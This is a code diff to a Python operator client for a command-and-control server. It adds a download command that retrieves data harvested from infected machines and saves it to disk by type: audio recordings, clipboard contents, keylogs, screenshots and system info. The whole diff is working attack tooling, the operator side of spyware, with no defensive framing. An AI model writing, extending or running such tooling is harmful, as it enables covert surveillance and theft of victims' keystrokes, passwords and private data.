@@ -8,6 +8,8 @@ import requests
 import json
 import argparse
 import sys
+import base64
+import os
 from tabulate import tabulate
 from datetime import datetime
 
@@ -163,6 +165,75 @@ class C2CLI:
         
         print(tabulate(table_data, headers=['Cap ID', 'Capability', 'Result', 'Timestamp']))
     
+    def download_result(self, client_id, output_dir='downloads'):
+        """Download and save all results from a client"""
+        response = self._request('GET', f'/api/client/{client_id}/results')
+        if not response:
+            return
+        
+        data = response.json()
+        if data.get('status') != 'success':
+            print(f"[-] {data.get('message')}")
+            return
+        
+        results = data.get('results', [])
+        if not results:
+            print("[*] No results to download")
+            return
+        
+        # Create output directory
+        os.makedirs(output_dir, exist_ok=True)
+        client_dir = os.path.join(output_dir, client_id)
+        os.makedirs(client_dir, exist_ok=True)
+        
+        print(f"\n[+] Downloading {len(results)} results to {client_dir}/\n")
+        
+        capabilities = {
+            1: {'name': 'audio', 'ext': '.wav'},
+            2: {'name': 'clipboard', 'ext': '.txt'},
+            3: {'name': 'keylog', 'ext': '.txt'},
+            4: {'name': 'screenshot', 'ext': '.bmp'},
+            5: {'name': 'info', 'ext': '.txt'}
+        }
+        
+        downloaded = 0
+        for idx, result in enumerate(results, 1):
+            cap_id = result.get('capability')
+            result_data = result.get('result', '')
+            timestamp = result.get('timestamp', 'unknown')[:19].replace(':', '-')
+            
+            if cap_id not in capabilities:
+                print(f"[*] Skipping result {idx}: Unknown capability {cap_id}")
+                continue
+            
+            cap_info = capabilities[cap_id]
+            filename = f"{cap_info['name']}_{timestamp}{cap_info['ext']}"
+            filepath = os.path.join(client_dir, filename)
+            
+            try:
+                # Try to decode as base64
+                decoded_data = base64.b64decode(result_data)
+                
+                # Write to file
+                with open(filepath, 'wb') as f:
+                    f.write(decoded_data)
+                
+                file_size = len(decoded_data)
+                print(f"[+] Saved {filename} ({file_size} bytes)")
+                downloaded += 1
+                
+            except Exception as e:
+                # If decoding fails, save as text
+                try:
+                    with open(filepath, 'w') as f:
+                        f.write(result_data)
+                    print(f"[+] Saved {filename} (text)")
+                    downloaded += 1
+                except Exception as e2:
+                    print(f"[-] Failed to save result {idx}: {str(e2)}")
+        
+        print(f"\n[+] Downloaded {downloaded}/{len(results)} files to {client_dir}/")
+    
     def server_status(self):
         """Get server status"""
         response = self._request('GET', '/')
@@ -187,6 +258,8 @@ def main():
     parser.add_argument('--client-info', help='Get info about specific client')
     parser.add_argument('--client-results', help='Get results from specific client')
     parser.add_argument('--send-command', nargs=2, metavar=('CLIENT_ID', 'CAPABILITY_ID'), help='Send command to client')
+    parser.add_argument('--download', help='Download all results from specific client')
+    parser.add_argument('--output-dir', default='downloads', help='Output directory for downloads (default: downloads)')
     
     args = parser.parse_args()
     
@@ -212,6 +285,8 @@ def main():
         cli.get_client_info(args.client_info)
     elif args.client_results:
         cli.get_client_results(args.client_results)
+    elif args.download:
+        cli.download_result(args.download, args.output_dir)
     elif args.send_command:
         client_id, cap_id = args.send_command
         try:
